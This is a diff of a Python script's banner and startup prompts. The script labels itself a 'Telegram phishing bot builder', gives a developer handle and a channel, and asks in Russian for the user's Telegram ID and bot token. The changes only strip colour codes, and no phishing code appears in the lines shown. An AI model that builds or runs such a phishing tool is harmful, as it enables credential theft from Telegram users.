@@ -44,16 +44,16 @@ print( '''
  "*$$$"            ^$$P
     ""              ^"
 	''')
-input(Fore.RED + "Нажмине Enter>>")
+input("Нажмине Enter>>")
 clear()
 
-print(Fore.MAGENTA + '''
+print('''
  _____ _____ _      _____
 |_   _|  ___| |    |  ___
   | | | |__ | |    | |__ 
   | | |  __|| |    |  __|
   | | | |___| |____| |___
-  \_/ \____/\_____/\____/ ''' + Fore.RED + '''
+  \_/ \____/\_____/\____/ '''+ '''
 ______ _   _ _____ _____ _   _ 
 | ___ \ | | |_   _/  ___| | | |
 | |_/ / |_| | | | \ `--.| |_| |
@@ -63,9 +63,9 @@ ______ _   _ _____ _____ _   _
 	''')
 
 print('#########################################')
-print("     Telegram phishing bot builder     " + Fore.GREEN + '+')
-print("       Developer: @lamer112311         " + Fore.GREEN + '+')
-print("        Channel: @Cyber_Puffin         " + Fore.GREEN + '+')
+print("     Telegram phishing bot builder     " )
+print("       Developer: @lamer112311         " )
+print("        Channel: @Cyber_Puffin         " )
 print('#########################################')
 userid = input("Введите свой Telegram ID > ")
 token = input("Введите токен бота > ")
